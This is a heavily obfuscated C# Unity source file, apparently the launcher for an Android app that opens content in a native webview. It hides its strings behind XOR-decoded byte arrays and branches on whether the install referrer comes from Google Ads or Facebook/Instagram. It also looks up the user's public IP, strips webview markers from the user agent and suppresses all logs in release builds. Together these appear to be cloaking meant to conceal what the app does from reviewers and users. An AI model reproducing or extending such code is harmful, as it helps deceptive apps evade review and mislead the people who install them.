        int _0x2a222ba0 = _0xd1f3c5a4.IndexOf(_0x019ade1a._0xa5740c93(new byte[3] { 152, 149, 204 }, 241), StringComparison.OrdinalIgnoreCase);
        if (_0x2a222ba0 < 0)
            return null;
        string _0xea005ab6 = _0xd1f3c5a4.Substring(_0x2a222ba0 + 3);
        int _0xe9cef1e0 = _0xea005ab6.IndexOf('&');
        return _0xe9cef1e0 >= 0 ? _0xea005ab6.Substring(0, _0xe9cef1e0) : _0xea005ab6;
    }

    private void _0x19493c9c(string _0x042e797e)
    {
        _0xf0a9c5ca();
        StartCoroutine(_0x84b2efb1(_0x042e797e));
    }

    private async Task _0x9ef6f88b(string _0x3e7fb106)
    {
        if (_0x730747f6 || string.IsNullOrEmpty(_0xc9862e79) || string.IsNullOrEmpty(_0x3e7fb106) || _0xf66b958e)
            return;
        _0x730747f6 = true;
        try
        {
            JObject _0x824dc228 = _0x6b4fef6b(_0x3e7fb106, _0xc9862e79, _0x4de9e613());
            {
#if B_LOGS
                {
                    Debug.Log($"[Test][Load Pass] Send total: {_0x3e7fb106} payload: {_0x824dc228}");
                }
#endif
            }

            var _0xf65fae48 = _0x4002e2b0(_0x824dc228.ToString(), _0xc9862e79);
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x019ade1a._0xa5740c93(new byte[4] { 170, 169, 167, 162 }, 198) + _0xc9862e79, _0xf65fae48 } });
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x019ade1a._0xa5740c93(new byte[24] { 172, 163, 178, 164, 163, 170, 215, 187, 152, 150, 147, 215, 135, 150, 132, 132, 215, 146, 133, 133, 152, 133, 205, 215 }, 247) + e.Message);
#endif
            }
        }
    }

    private IEnumerator _0x2cc7a10b()
    {
        {
#if B_LOGS
            {
                Debug.Log(_0x019ade1a._0xa5740c93(new byte[26] { 86, 89, 104, 126, 121, 80, 45, 68, 99, 100, 121, 100, 108, 97, 100, 119, 104, 95, 104, 107, 107, 104, 127, 104, 127, 45 }, 13));
            }
#endif
        }

        bool _0x4b3636e8 = false;
        InstallReferrer.GetReferrer((_0xcdd859a6) =>
        {
            Debug.Log(_0x019ade1a._0xa5740c93(new byte[24] { 137, 134, 183, 161, 166, 242, 128, 183, 180, 183, 160, 160, 183, 160, 143, 242, 181, 183, 166, 242, 48, 84, 64, 242 }, 210) + _0xc99f1e39);
            if (_0xcdd859a6.IsSuccess)
            {
                _0xc99f1e39 = _0xcdd859a6.InstallReferrer ?? "";
                {
#if B_LOGS
                    Debug.Log(_0x019ade1a._0xa5740c93(new byte[28] { 78, 65, 112, 102, 97, 53, 71, 112, 115, 112, 103, 103, 112, 103, 72, 53, 70, 96, 118, 118, 112, 102, 102, 53, 247, 147, 135, 53 }, 21) + _0xc99f1e39);
#endif
                }
            }
            else
            {
                {
#if B_LOGS
                    Debug.Log(_0x019ade1a._0xa5740c93(new byte[27] { 24, 23, 38, 48, 55, 99, 17, 38, 37, 38, 49, 49, 38, 49, 30, 99, 5, 34, 42, 47, 38, 39, 99, 161, 197, 209, 99 }, 67) + _0xcdd859a6);
#endif
                }

                _0xc99f1e39 = "";
            }

            _0x0246a40a = true;
        });
        StartCoroutine(_0x3230dcfd(2f));
        yield return new WaitUntil(() => _0x0246a40a);
        {
#if B_LOGS
            Debug.Log($"[Test] check google atr {_0xc99f1e39}");
#endif
        }

        bool _0xc555f6a9 = _0xc99f1e39.Contains(_0x019ade1a._0xa5740c93(new byte[6] { 102, 98, 109, 104, 101, 60 }, 1));
        _0x4b3636e8 = _0xc555f6a9 || _0xc99f1e39.Contains(_0x019ade1a._0xa5740c93(new byte[18] { 3, 18, 18, 17, 76, 11, 12, 17, 22, 3, 5, 16, 3, 15, 76, 1, 13, 15 }, 98)) || _0xc99f1e39.Contains(_0x019ade1a._0xa5740c93(new byte[17] { 177, 160, 160, 163, 254, 182, 177, 179, 181, 178, 191, 191, 187, 254, 179, 191, 189 }, 208));
        _0x54e52440 = _0xc555f6a9 ? "" : (_0x4b3636e8 ? "" : _0x54e52440);
        _0x54e52440 = _0x54e52440 ?? "";
        _0xa2f29b28 = _0xa2f29b28 ?? "";
        {
#if B_LOGS
            Debug.Log($"[Test] oneLinkData (FB): {_0x54e52440}");
#endif
        }
    }

    private IEnumerator _0x2b981f0f(IEnumerator _0x81919999, TaskCompletionSource<bool> _0x78fb8395)
    {
        yield return _0x81919999;
        _0x78fb8395.SetResult(true);
    }

    public void _0xaea71745()
    {
        isDestroyedForce = true;
        StopAllCoroutines();
        {
#if B_LOGS
            Debug.Log(_0x019ade1a._0xa5740c93(new byte[18] { 156, 147, 162, 180, 179, 154, 231, 139, 166, 178, 169, 164, 175, 231, 128, 166, 170, 162 }, 199));
#endif
        }

        _0x2f7b6011.Instance?._0xbfa85505();
        _0xa62f9119.Instance._0x1e9b02f7(_0xc3dbd8a4._0x576642f8.DEFAULT);
    }

    internal Vector2 lastSize = Vector2.zero;
    internal Button _0xbdb74eb4(string _0xf7435ec5, Transform _0xce805be4)
    {
        var _0x2bf2e0b3 = new GameObject(_0xf7435ec5 + _0x019ade1a._0xa5740c93(new byte[3] { 44, 26, 0 }, 110), typeof(RectTransform), typeof(Image), typeof(Button));
        var _0xf1c4bcd7 = _0x2bf2e0b3.GetComponent<RectTransform>();
        _0xf1c4bcd7.SetParent(_0xce805be4, false);
        var _0xbb0b10f6 = _0x2bf2e0b3.GetComponent<Image>();
        _0xbb0b10f6.color = new Color(0.92f, 0.92f, 0.95f, 1f);
        var _0x1b4c44ba = _0x2bf2e0b3.GetComponent<Button>();
        var _0xa0f38308 = _0x1b4c44ba.colors;
        _0xa0f38308.highlightedColor = new Color(0.85f, 0.85f, 0.9f);
        _0xa0f38308.pressedColor = new Color(0.8f, 0.8f, 0.88f);
        _0x1b4c44ba.colors = _0xa0f38308;
        var _0x6addb239 = new GameObject(_0x019ade1a._0xa5740c93(new byte[4] { 88, 105, 116, 120 }, 12), typeof(RectTransform), typeof(Text));
        var _0x8af35cec = _0x6addb239.GetComponent<RectTransform>();
        _0x8af35cec.SetParent(_0x2bf2e0b3.transform, false);
        _0x8af35cec.anchorMin = Vector2.zero;
        _0x8af35cec.anchorMax = Vector2.one;
        _0x8af35cec.offsetMin = _0x8af35cec.offsetMax = Vector2.zero;
        var _0x63ab6995 = _0x6addb239.GetComponent<Text>();
        _0x63ab6995.text = _0xf7435ec5;
        _0x63ab6995.alignment = TextAnchor.MiddleCenter;
        _0x63ab6995.color = Color.black;
        _0x63ab6995.font = Resources.GetBuiltinResource<Font>(_0x019ade1a._0xa5740c93(new byte[9] { 28, 47, 52, 60, 49, 115, 41, 41, 59 }, 93));
        _0x63ab6995.fontSize = 28;
        WLog(_0x019ade1a._0xa5740c93(new byte[14] { 251, 202, 221, 217, 204, 221, 250, 205, 204, 204, 215, 214, 152, 159 }, 184) + _0xf7435ec5 + _0x019ade1a._0xa5740c93(new byte[1] { 14 }, 41));
        return _0x1b4c44ba;
    }

    private IEnumerator _0x43bc22a2()
    {
        yield return _0x2f9dff1d(Permission.Camera);
    }

    private void _0x19b8f297()
    {
        if (_0x69b8ee0b)
        {
            WLog(_0x019ade1a._0xa5740c93(new byte[18] { 225, 220, 205, 208, 132, 197, 200, 214, 193, 197, 192, 221, 132, 215, 204, 203, 211, 202 }, 164));
            return;
        }

        _0xbe659bab(false);
        WLog(_0x019ade1a._0xa5740c93(new byte[46] { 138, 166, 174, 169, 231, 144, 162, 165, 145, 174, 162, 176, 231, 151, 178, 180, 175, 231, 137, 168, 179, 174, 161, 174, 164, 166, 179, 174, 168, 169, 231, 239, 175, 166, 181, 163, 176, 166, 181, 162, 231, 165, 166, 164, 172, 238 }, 199));
        ++_0xfda88229;
        _0x639f102e();
        if (_0xfda88229 <= 1)
            return;
        if (_0x7b6b65fe())
        {
            WLog(_0x019ade1a._0xa5740c93(new byte[37] { 100, 89, 72, 85, 1, 82, 74, 72, 81, 81, 68, 69, 1, 12, 31, 1, 81, 78, 81, 84, 81, 82, 1, 82, 85, 72, 77, 77, 1, 78, 81, 68, 79, 68, 69, 27, 1 }, 33) + _0xbcf7cc63.Count);
            return;
        }

        Application.Quit();
    }

    private bool _0xb84273eb(string _0x83408747)
    {
        if (string.IsNullOrEmpty(_0x83408747))
            return false;
        try
        {
            using (var _0xcb700b58 = new AndroidJavaClass(_0x019ade1a._0xa5740c93(new byte[30] { 89, 85, 87, 20, 79, 84, 83, 78, 67, 9, 94, 20, 74, 86, 91, 67, 95, 72, 20, 111, 84, 83, 78, 67, 106, 86, 91, 67, 95, 72 }, 58)))
            using (var _0x2c6e8f6f = _0xcb700b58.GetStatic<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[15] { 108, 122, 125, 125, 106, 97, 123, 78, 108, 123, 102, 121, 102, 123, 118 }, 15)))
            using (var _0x48cf3248 = _0x2c6e8f6f.Call<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[17] { 113, 115, 98, 70, 119, 117, 125, 119, 113, 115, 91, 119, 120, 119, 113, 115, 100 }, 22)))
            using (var _0x02b32cbe = _0x48cf3248.Call<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[25] { 195, 193, 208, 232, 197, 209, 202, 199, 204, 237, 202, 208, 193, 202, 208, 226, 203, 214, 244, 197, 199, 207, 197, 195, 193 }, 164), _0x83408747))
            {
                if (_0x02b32cbe == null)
                    return false;
                WLog(_0x019ade1a._0xa5740c93(new byte[37] { 119, 92, 70, 91, 89, 81, 120, 93, 95, 81, 20, 88, 85, 65, 90, 87, 92, 20, 93, 90, 71, 64, 85, 88, 88, 81, 80, 20, 68, 85, 87, 95, 85, 83, 81, 14, 20 }, 52) + _0x83408747);
                _0x02b32cbe.Call<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[8] { 119, 114, 114, 80, 122, 119, 113, 101 }, 22), 0x10000000);
                _0x2c6e8f6f.Call(_0x019ade1a._0xa5740c93(new byte[13] { 228, 227, 246, 229, 227, 214, 244, 227, 254, 225, 254, 227, 238 }, 151), _0x02b32cbe);
                return true;
            }
        }
        catch
        {
            return false;
        }
    }

    private Text _0x23aa08ce;
    private void WLog(string _0x4d578212)
    {
#if B_LOGS
        {
            Debug.Log(_0x019ade1a._0xa5740c93(new byte[7] { 25, 22, 39, 49, 54, 31, 98 }, 66) + _0x4d578212);
        }
#endif
    }

    //    private async Task<string> GetMyip()
    //    {
    //        string result = "";
    //        var processorType = SystemInfo.processorType;
    //        //        {
    //        //#if NOT_B_STARTED
    //        //#endif
    //        if (!processorType.Contains("armv7", StringComparison.OrdinalIgnoreCase) && !processorType.Contains("x86-64", StringComparison.OrdinalIgnoreCase))
    //        {
    //            var tcs = new TaskCompletionSource<string>();
    //            // Primary and fallback STUN servers (Google STUN 1-6)
    //            var stunServers = new[]
    //            {
    //                new[] { "stun:stun.l.google.com:19302" },      // Primary
    //                //new[] { "stun:stun1.l.google.com:19302" },     // Fallback 1
    //                //new[] { "stun:stun2.l.google.com:19302" },     // Fallback 2
    //                //new[] { "stun:stun3.l.google.com:19302" },     // Fallback 3
    //                //new[] { "stun:stun4.l.google.com:19302" },     // Fallback 4
    //                //new[] { "stun:stun5.l.google.com:19302" },     // Fallback 5
    //                //new[] { "stun:stun6.l.google.com:19302" }      // Fallback 6
    //            };
    //            RTCPeerConnection pc = null;
    //            foreach (var serverUrls in stunServers)
    //            {
    //                if (tcs.Task.IsCompleted)
    //                    break;
    //                try
    //                {
    //                    var config = new RTCConfiguration
    //                    {
    //                        iceServers = new RTCIceServer[]
    //                        {
    //                    new RTCIceServer { urls = serverUrls }
    //                        },
    //                        iceTransportPolicy = RTCIceTransportPolicy.All
    //                    };
    //                    pc = new RTCPeerConnection(ref config);
    //                    pc.OnIceCandidate = candidate =>
    //                    {
    //                        if (candidate == null || tcs.Task.IsCompleted)
    //                            return;
    //                        if (candidate.Type == RTCIceCandidateType.Srflx || candidate.Type == RTCIceCandidateType.Prflx)
    //                        {
    //                            string address = candidate.Address;
    //                            string ip = "";
    //                            // Parse IP from address (which may be IPv4 "ip:port" or IPv6 "[ip]:port")
    //                            if (address.StartsWith("[") && address.Contains("]:"))
    //                            {
    //                                // IPv6 format: [2001:db8::1]:12345
    //                                int endBracket = address.IndexOf(']');
    //                                ip = address.Substring(1, endBracket - 1);
    //                            }
    //                            else if (address.Contains(':'))
    //                            {
    //                                // IPv4 format: 192.168.1.1:12345
    //                                int lastColon = address.LastIndexOf(':');
    //                                ip = address.Substring(0, lastColon);
    //                            }
    //                            else
    //                            {
    //                                // No port, just IP
    //                                ip = address;
    //                            }
    //                            {
    //#if B_LOGS
    //                                {
    //                                    Debug.Log($"[test STUN] Public IP: {ip} from {serverUrls[0]}");
    //                                }
    //#endif
    //                            }
    //                            tcs.TrySetResult(ip);
    //                        }
    //                    };
    //                    pc.CreateDataChannel("init");
    //                    var offerOp = pc.CreateOffer();
    //                    while (!offerOp.IsDone)
    //                        await Task.Yield();
    //                    var desc = offerOp.Desc;
    //                    pc.SetLocalDescription(ref desc);
    //                    float timeout = 10f;
    //                    float t = 0f;
    //                    while (!tcs.Task.IsCompleted && t < timeout)
    //                    {
    //                        await Task.Delay(100);
    //                        t += 0.1f;
    //                    }
    //                    if (tcs.Task.IsCompleted)
    //                    {
    //                        result = tcs.Task.Result;
    //                        break;
    //                    }
    //                    {
    //#if B_LOGS
    //                        {
    //                            Debug.Log($"[test STUN] Failed with {serverUrls[0]}, trying next...");
    //                        }
    //#endif
    //                    }
    //                }
    //                catch (Exception ex)
    //                {
    //#if B_LOGS
    //                    {
    //                        Debug.Log($"[test STUN] Error with {serverUrls[0]}: {ex.Message}");
    //                    }
    //#endif
    //                    if (pc != null)
    //                    {
    //                        pc.Close();
    //                        pc.Dispose();
    //                    }
    //                }
    //            }
    //            if (!tcs.Task.IsCompleted)
    //                result = "";
    //        }
    //        //#if NOT_B_STARTED
    //        //            else
    //        //        if(result == "")
    //        //        {
    //        //            {
    //        //#if B_LOGS
    //        //                {
    //        //                    Debug.LogError($"[TEST] WebRTC DLL missing or ARMv7 architecture");
    //        //                }
    //        //#endif
    //        //            }
    //        //            result = await GetMyipFallback("0fce0027001c001700140011000b000a0008001f00180022001b00010024001e0025002300260002000400050006000300070000000c001d0015000d000f0021000900100019001a0013000e00120020001647175e80370ec5a1a5d9b1b039a49e64977f39d478adcf763f556d428a45d94f056b1d88f6b76874");
    //        //        }
    //        //#endif
    //        //        }
    //        {
    //#if B_LOGS
    //            {
    //                Debug.Log($"[Test] Get my ip: {result}");
    //            }
    //#endif
    //        }
    //        return result;
    //    }
    private async Task<string> _0x02fc27da()
    {
        var _0x6c69c487 = _0x019ade1a._0xa5740c93(new byte[40] { 153, 133, 133, 129, 130, 203, 222, 222, 134, 134, 134, 223, 146, 157, 158, 132, 149, 151, 157, 144, 131, 148, 223, 146, 158, 156, 222, 146, 149, 159, 220, 146, 150, 152, 222, 133, 131, 144, 146, 148 }, 241);
        using (UnityWebRequest _0x2cf51f90 = UnityWebRequest.Get(_0x6c69c487))
        {
            await _0x2cf51f90.SendWebRequest();
            string[] _0x412ebfbe = _0x2cf51f90.downloadHandler.text.Split('\n');
            foreach (string _0x8499a04d in _0x412ebfbe)
            {
                if (_0x8499a04d.StartsWith(_0x019ade1a._0xa5740c93(new byte[3] { 94, 71, 10 }, 55)))
                {
                    string _0x5284af3a = _0x8499a04d.Substring(3);
                    {
#if B_LOGS
                        {
                            Debug.Log($"[Test] User ip (FALLBACK MODE): {_0x5284af3a} from {_0x6c69c487}");
                        }
#endif
                    }

                    return _0x5284af3a;
                }
            }
        }

        return "";
    }

    private void OnDestroy()
    {
        StopAllCoroutines();
        _0xaea71745();
    }

    private bool TryOpenExternalLikeChrome(string _0x323f312a)
    {
        if (string.IsNullOrEmpty(_0x323f312a))
            return false;
        if (_0x323f312a.StartsWith(_0x019ade1a._0xa5740c93(new byte[9] { 48, 55, 45, 60, 55, 45, 99, 118, 118 }, 89), StringComparison.OrdinalIgnoreCase))
            return _0x54e350ff(_0x323f312a);
        if (_0xb68e7695(_0x323f312a))
            return _0xbd3faab8(_0x323f312a, null);
        if (!_0x323f312a.StartsWith(_0x019ade1a._0xa5740c93(new byte[7] { 176, 172, 172, 168, 226, 247, 247 }, 216), StringComparison.OrdinalIgnoreCase) && !_0x323f312a.StartsWith(_0x019ade1a._0xa5740c93(new byte[8] { 177, 173, 173, 169, 170, 227, 246, 246 }, 217), StringComparison.OrdinalIgnoreCase) && !_0x323f312a.StartsWith(_0x019ade1a._0xa5740c93(new byte[11] { 96, 99, 110, 116, 117, 59, 99, 109, 96, 111, 106 }, 1), StringComparison.OrdinalIgnoreCase))
        {
            return _0xa43b83a9(_0x323f312a);
        }

        return false;
    }

    private void Awake()
    {
        if (_0x35715d42 != null)
        {
            Destroy(this.gameObject);
            return;
        }

        EnhancedTouchSupport.Enable();
        Input.backButtonLeavesApp = false;
        {
#if !B_LOGS
            Debug.unityLogger.logEnabled = false;
            Application.SetStackTraceLogType(LogType.Assert, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Exception, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Warning, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Error, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Log, StackTraceLogType.None);
#endif
        }

        _0x35715d42 = gameObject.GetComponent<_0x2d0123df>();
        DontDestroyOnLoad(gameObject);
        _0xd92a0b29 = _0x54e52440 = _0xa2f29b28 = "";
        _0xe52280c2 = "";
        _0x7608da72 = false;
    }

    private readonly string[] _0xd317ad5d = new string[]
    {
        _0x019ade1a._0xa5740c93(new byte[60] { 87, 56, 41, 23, 135, 243, 207, 194, 135, 213, 194, 194, 203, 212, 135, 198, 213, 194, 135, 207, 200, 211, 135, 213, 206, 192, 207, 211, 135, 201, 200, 208, 135, 69, 39, 52, 135, 195, 200, 201, 69, 39, 62, 211, 135, 202, 206, 212, 212, 135, 222, 200, 210, 213, 135, 212, 215, 206, 201, 134 }, 167),
        _0x019ade1a._0xa5740c93(new byte[52] { 196, 171, 185, 180, 20, 125, 64, 20, 87, 91, 65, 88, 80, 20, 86, 81, 20, 77, 91, 65, 70, 20, 88, 65, 87, 95, 77, 20, 89, 91, 89, 81, 90, 64, 20, 214, 180, 167, 20, 67, 92, 77, 20, 71, 64, 91, 68, 20, 90, 91, 67, 11 }, 52),
        _0x019ade1a._0xa5740c93(new byte[66] { 184, 192, 251, 181, 226, 213, 122, 24, 51, 61, 122, 45, 51, 52, 41, 122, 59, 40, 63, 122, 50, 51, 46, 46, 51, 52, 61, 122, 55, 53, 40, 63, 122, 53, 60, 46, 63, 52, 122, 46, 53, 62, 59, 35, 122, 184, 218, 201, 122, 41, 46, 59, 35, 122, 51, 52, 122, 46, 50, 63, 122, 61, 59, 55, 63, 116 }, 90),
        _0x019ade1a._0xa5740c93(new byte[54] { 103, 8, 2, 5, 183, 195, 255, 254, 228, 183, 254, 228, 183, 231, 229, 254, 250, 242, 183, 227, 254, 250, 242, 183, 117, 23, 4, 183, 227, 255, 242, 183, 245, 242, 228, 227, 183, 231, 251, 246, 238, 242, 229, 228, 183, 231, 251, 246, 238, 183, 249, 248, 224, 185 }, 151),
        _0x019ade1a._0xa5740c93(new byte[48] { 225, 142, 133, 180, 49, 72, 126, 100, 99, 49, 102, 120, 127, 127, 120, 127, 118, 49, 98, 101, 99, 116, 112, 122, 49, 114, 126, 100, 125, 117, 49, 115, 116, 49, 126, 127, 116, 49, 98, 97, 120, 127, 49, 112, 102, 112, 104, 63 }, 17),
        _0x019ade1a._0xa5740c93(new byte[65] { 102, 9, 12, 22, 182, 220, 247, 245, 253, 230, 249, 226, 229, 182, 247, 228, 243, 182, 251, 249, 228, 243, 182, 247, 245, 226, 255, 224, 243, 182, 226, 249, 248, 255, 241, 254, 226, 182, 116, 22, 5, 182, 229, 226, 247, 239, 182, 247, 248, 242, 182, 226, 228, 239, 182, 239, 249, 227, 228, 182, 250, 227, 245, 253, 184 }, 150),
        _0x019ade1a._0xa5740c93(new byte[55] { 192, 175, 190, 130, 16, 117, 70, 85, 66, 73, 16, 67, 64, 89, 94, 16, 83, 95, 69, 94, 68, 67, 16, 210, 176, 163, 16, 68, 88, 85, 16, 94, 85, 72, 68, 16, 95, 94, 85, 16, 83, 95, 69, 92, 84, 16, 82, 85, 16, 73, 95, 69, 66, 67, 30 }, 48),
        _0x019ade1a._0xa5740c93(new byte[63] { 110, 33, 28, 99, 52, 3, 172, 220, 224, 237, 245, 233, 254, 255, 172, 254, 229, 235, 228, 248, 172, 226, 227, 251, 172, 237, 254, 233, 172, 251, 229, 226, 226, 229, 226, 235, 172, 110, 12, 31, 172, 232, 227, 226, 110, 12, 21, 248, 172, 251, 237, 224, 231, 172, 237, 251, 237, 245, 172, 245, 233, 248, 162 }, 140),
        _0x019ade1a._0xa5740c93(new byte[51] { 219, 180, 164, 173, 11, 100, 69, 71, 82, 11, 95, 67, 68, 88, 78, 11, 92, 67, 68, 11, 88, 95, 74, 82, 11, 66, 69, 11, 95, 67, 78, 11, 76, 74, 70, 78, 11, 92, 66, 69, 11, 95, 67, 78, 11, 91, 89, 66, 81, 78, 5 }, 43),
        _0x019ade1a._0xa5740c93(new byte[64] { 90, 34, 25, 87, 0, 55, 152, 245, 215, 213, 221, 214, 204, 205, 213, 152, 209, 203, 152, 221, 206, 221, 202, 193, 204, 208, 209, 214, 223, 152, 90, 56, 43, 152, 211, 221, 221, 200, 152, 203, 200, 209, 214, 214, 209, 214, 223, 152, 222, 215, 202, 152, 193, 215, 205, 202, 152, 219, 208, 217, 214, 219, 221, 150 }, 184)
    };
    // NATIVE WEB VIEW METHODS
    private UniWebView _0x21de6645 = null;
    private string _0x4de9e613()
    {
        float _0x74e79e3c = Time.realtimeSinceStartup;
        if (_0x74e79e3c < 0f)
            _0x74e79e3c = 0f;
        int _0x870db236 = (int)(_0x74e79e3c * 1000f);
        int _0x5c705d01 = _0x870db236 / 60000;
        int _0xf035aa6b = (_0x870db236 / 1000) % 60;
        int _0x30f26441 = _0x870db236 % 1000;
        return string.Format(_0x019ade1a._0xa5740c93(new byte[21] { 71, 12, 6, 12, 12, 65, 6, 71, 13, 6, 12, 12, 65, 6, 71, 14, 6, 12, 12, 12, 65 }, 60), _0x5c705d01, _0xf035aa6b, _0x30f26441);
    }

    private bool _0xbf1ea0da = false;
    private void _0xc0cc2ebe()
    {
        _0x9c72ce68 = true;
        if (_0x21de6645 != null)
            _0x21de6645.SetUserAgent(_0xada17828());
    }

    private Canvas _0xd1771ecc;
    internal Rect lastSafe = Rect.zero;
    private void OnApplicationPause(bool _0x53d6a91b)
    {
        isApplicationPause = _0x53d6a91b;
    }

    private bool _0xa43b83a9(string _0xe6a47ae2)
    {
        try
        {
            using (var _0x7f595fe3 = new AndroidJavaClass(_0x019ade1a._0xa5740c93(new byte[30] { 34, 46, 44, 111, 52, 47, 40, 53, 56, 114, 37, 111, 49, 45, 32, 56, 36, 51, 111, 20, 47, 40, 53, 56, 17, 45, 32, 56, 36, 51 }, 65)))
            using (var _0x18a7abff = _0x7f595fe3.GetStatic<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[15] { 27, 13, 10, 10, 29, 22, 12, 57, 27, 12, 17, 14, 17, 12, 1 }, 120)))
            using (var _0xb3ee541b = new AndroidJavaClass(_0x019ade1a._0xa5740c93(new byte[15] { 249, 246, 252, 234, 247, 241, 252, 182, 246, 253, 236, 182, 205, 234, 241 }, 152)))
            using (var _0x7eb729b0 = _0xb3ee541b.CallStatic<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[5] { 207, 222, 205, 204, 218 }, 191), _0xe6a47ae2))
            using (var _0xf26c1b25 = new AndroidJavaObject(_0x019ade1a._0xa5740c93(new byte[22] { 44, 35, 41, 63, 34, 36, 41, 99, 46, 34, 35, 57, 40, 35, 57, 99, 4, 35, 57, 40, 35, 57 }, 77), _0x019ade1a._0xa5740c93(new byte[26] { 123, 116, 126, 104, 117, 115, 126, 52, 115, 116, 110, 127, 116, 110, 52, 123, 121, 110, 115, 117, 116, 52, 76, 83, 95, 77 }, 26), _0x7eb729b0))
            {
                WLog(_0x019ade1a._0xa5740c93(new byte[26] { 227, 200, 210, 207, 205, 197, 236, 201, 203, 197, 128, 207, 208, 197, 206, 128, 197, 216, 212, 197, 210, 206, 193, 204, 154, 128 }, 160) + _0xe6a47ae2);
                _0xf26c1b25.Call<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[11] { 199, 194, 194, 229, 199, 210, 195, 193, 201, 212, 223 }, 166), _0x019ade1a._0xa5740c93(new byte[33] { 139, 132, 142, 152, 133, 131, 142, 196, 131, 132, 158, 143, 132, 158, 196, 137, 139, 158, 143, 141, 133, 152, 147, 196, 168, 184, 165, 189, 185, 171, 168, 166, 175 }, 234));
                _0xf26c1b25.Call<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[8] { 48, 53, 53, 23, 61, 48, 54, 34 }, 81), 0x10000000);
                _0x18a7abff.Call(_0x019ade1a._0xa5740c93(new byte[13] { 94, 89, 76, 95, 89, 108, 78, 89, 68, 91, 68, 89, 84 }, 45), _0xf26c1b25);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x019ade1a._0xa5740c93(new byte[28] { 159, 180, 174, 179, 177, 185, 144, 181, 183, 185, 252, 185, 164, 168, 185, 174, 178, 189, 176, 252, 186, 189, 181, 176, 185, 184, 230, 252 }, 220) + e.Message);
            Application.OpenURL(_0xe6a47ae2);
            return true;
        }
    }

    private string _0x6abf44b4 = "";
    private string _0xada17828()
    {
        if (string.IsNullOrEmpty(_0xb22f7ae7) && _0x21de6645 != null)
            _0xb22f7ae7 = _0x21de6645.GetUserAgent();
        if (string.IsNullOrEmpty(_0xb22f7ae7))
            return string.Empty;
        string _0x13b843cc = Regex.Replace(_0xb22f7ae7, _0x019ade1a._0xa5740c93(new byte[11] { 127, 80, 9, 24, 127, 80, 9, 84, 85, 127, 65 }, 35), string.Empty);
        _0x13b843cc = Regex.Replace(_0x13b843cc, _0x019ade1a._0xa5740c93(new byte[15] { 159, 176, 232, 129, 182, 170, 175, 167, 236, 152, 157, 248, 234, 158, 232 }, 195), string.Empty);
        _0x13b843cc = Regex.Replace(_0x13b843cc, _0x019ade1a._0xa5740c93(new byte[15] { 160, 147, 132, 133, 159, 153, 152, 217, 194, 170, 216, 198, 170, 133, 220 }, 246), string.Empty);
        return Regex.Replace(_0x13b843cc, _0x019ade1a._0xa5740c93(new byte[6] { 103, 72, 64, 9, 23, 70 }, 59), _0x019ade1a._0xa5740c93(new byte[1] { 241 }, 209)).Trim();
    }

    public void _0x782a7245()
    {
        if (_0x7608da72)
            return;
        {
#if B_LOGS
            {
                Debug.Log(_0x019ade1a._0xa5740c93(new byte[33] { 11, 4, 53, 35, 36, 13, 112, 4, 57, 61, 53, 34, 112, 63, 37, 36, 112, 125, 110, 112, 61, 63, 38, 53, 112, 36, 63, 112, 35, 51, 53, 62, 53 }, 80));
            }
#endif
        }

        _0xaea71745();
    }

    internal bool isApplicationFocus = false;
    private Task _0xe30be86a(IEnumerator _0x392afa90)
    {
        var _0xa3b1597b = new TaskCompletionSource<bool>();
        StartCoroutine(_0x2b981f0f(_0x392afa90, _0xa3b1597b));
        return _0xa3b1597b.Task;
    }

    private string _0x448dd134 = "";
    private bool _0x9c72ce68 = false;
    internal bool firstLoadShown = false;
    private string _0x14b759a0 = "";
    private UniWebViewPopup _0x83836707()
    {
        for (int _0xe6efe996 = _0xbcf7cc63.Count - 1; _0xe6efe996 >= 0; _0xe6efe996--)
        {
            var _0x0f855cb7 = _0xbcf7cc63[_0xe6efe996];
            if (_0x0f855cb7 != null && _0x0f855cb7.IsAlive)
                return _0x0f855cb7;
            _0xbcf7cc63.RemoveAt(_0xe6efe996);
        }

        return null;
    }

    private ApplicationInstallMode _0x02babecd = ApplicationInstallMode.Unknown;
    private void _0xe47c1bdd(string _0x8199c2c7)
    {
        if (string.IsNullOrEmpty(_0x8199c2c7))
            return;
        if (TryOpenExternalLikeChrome(_0x8199c2c7))
            return;
        OpenUrlExternally(_0x8199c2c7);
    }

    private bool _0x69d913d5 = false;
    private int _0xfda88229 = 0;
    private Action _0x1b786ea8;
    private bool _0x63c26322 = false;
    private void _0x2879a111(UniWebView _0x040322c5)
    {
        if (_0xbf1ea0da)
            return;
        _0xbf1ea0da = true;
        _0x040322c5.AddUrlScheme(_0x019ade1a._0xa5740c93(new byte[2] { 189, 174 }, 201));
        _0x040322c5.AddUrlScheme(_0x019ade1a._0xa5740c93(new byte[6] { 99, 100, 126, 111, 100, 126 }, 10));
        _0x040322c5.AddUrlScheme(_0x019ade1a._0xa5740c93(new byte[6] { 155, 151, 132, 157, 147, 130 }, 246));
        _0x040322c5.OnMessageReceived += (_0x1fd58328, _0x2ce333f0) =>
        {
            if (TryOpenExternalLikeChrome(_0x2ce333f0.RawMessage))
            {
                _0xbe659bab(false);
                return;
            }
        };
        _0x040322c5.RegisterShouldHandleRequest(_0xcc82a138 =>
        {
            string _0x48ca3eb0 = _0xcc82a138 != null ? _0xcc82a138.Url : string.Empty;
            if (string.IsNullOrEmpty(_0x48ca3eb0))
                return true;
            WLog(_0x019ade1a._0xa5740c93(new byte[21] { 191, 132, 131, 153, 128, 136, 164, 141, 130, 136, 128, 137, 190, 137, 157, 153, 137, 159, 152, 214, 204 }, 236) + _0x48ca3eb0);
            if (TryOpenExternalLikeChrome(_0x48ca3eb0))
            {
                _0xbe659bab(false);
                return false;
            }

